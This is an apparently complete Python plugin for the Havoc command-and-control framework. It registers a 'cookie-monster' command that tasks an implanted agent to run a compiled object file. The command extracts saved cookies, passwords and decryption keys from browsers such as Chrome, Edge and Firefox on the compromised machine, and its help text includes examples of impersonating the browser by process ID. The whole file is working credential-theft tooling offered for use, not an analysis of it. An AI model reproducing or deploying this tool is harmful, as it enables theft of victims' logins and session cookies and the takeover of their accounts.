#!/usr/bin/env python3
from havoc import Demon, RegisterCommand

def CookieMonster(demon_id, *args):
    task_id: str = None
    demon: Demon = None
    packer: Packer = Packer()
    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    Browser: str = ""
    Browser_Path: str = ""
    Cookies_only: bool = False
    Passwords_only: bool = False
    Key_only: bool = False
    Browser_pid: int = 0
    BrowserCookie_pid: int = 0
    BrowserPassword_pid: int = 0

    if args:
        Browser = str(args[0]) if len(args) > 0 and args[0] is not None else Browser
        Browser_Path = str(args[1]) if len(args) > 1 and args[1] is not None else Browser_Path
        try:
            Browser_pid = int(args[2]) if len(args) > 2 and args[2] is not None and str(args[2]).lstrip('-').isdigit() else Browser_pid
            BrowserCookie_pid = int(args[6]) if len(args) > 6 and args[6] is not None and str(args[6]).lstrip('-').isdigit() else BrowserCookie_pid
            BrowserPassword_pid = int(args[7]) if len(args) > 7 and args[7] is not None and str(args[7]).lstrip('-').isdigit() else BrowserPassword_pid
        except (ValueError, TypeError):
            Browser_pid = Browser_pid  # Keep default if conversion fails
            BrowserCookie_pid = BrowserCookie_pid  # Keep default if conversion fails
            BrowserPassword_pid = BrowserPassword_pid  # Keep default if conversion fails
        Cookies_only = str(args[3]).lower() == 'true' if len(args) > 3 and args[3] is not None else Cookies_only
        Passwords_only = str(args[4]).lower() == 'true' if len(args) > 4 and args[4] is not None else Passwords_only
        Key_only = str(args[5]).lower() == 'true' if len(args) > 5 and args[5] is not None else Key_only


    packer.addstr(Browser)
    packer.addstr(Browser_Path)
    packer.addint(Browser_pid)
    packer.addbool(Cookies_only)
    packer.addbool(Passwords_only)
    packer.addbool(Key_only)
    packer.addint(BrowserCookie_pid)
    packer.addint(BrowserPassword_pid)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked demon to dump passwords/cookies")
    demon.InlineExecute(task_id, "go", "./cookie-monster.o", packer.getbuffer(), False)
    return task_id


RegisterCommand(
    CookieMonster,
    "",
    "cookie-monster",
    "Extract and dump saved cookies/passwords from browsers (Chrome, Edge, Firefox, Brave, etc.)",
    0,
    "<OPT:Browser> <OPT:Browser_Path> <OPT:Browser_Pid> <OPT:Cookies_Only> <OPT:Passwords_Only> <OPT:Key_Only> <OPT:BrowserCookiePID> <OPT:BrowserPasswordPID>",
    """
    cookie-monster                                       - Find Browsers And Extract All Data
    cookie-monster chrome                                - Extract data from Chrome (default profile)
    cookie-monster edge                                  - Extract data from Edge
    cookie-monster firefox                               - Extract data from Firefox
    cookie-monster "" "C:\\Users\\user\\AppData\\Local\\Google\\Chrome\\User Data\\Local State" 9999  - Extract from custom browser profile path as system ( Make sure to provide browser PID for impersonation )
    cookie-monster chrome "" 0 true                      - Extract only cookies from Chrome
    cookie-monster firefox                               - Extract passwords and cookies from Firefox
    cookie-monster chrome "" 0 false false true          - Extract only the key from chrome
    cookie-monster chrome "" 0 false false true          - Extract only the key from chrome
    cookie-monster chrome "" 0 false false true 0 9999   - Extract only the key from chrome use PID
    cookie-monster chrome "" 0 true true true 9999 0     - Extract everything from chrome use PID
   """
)
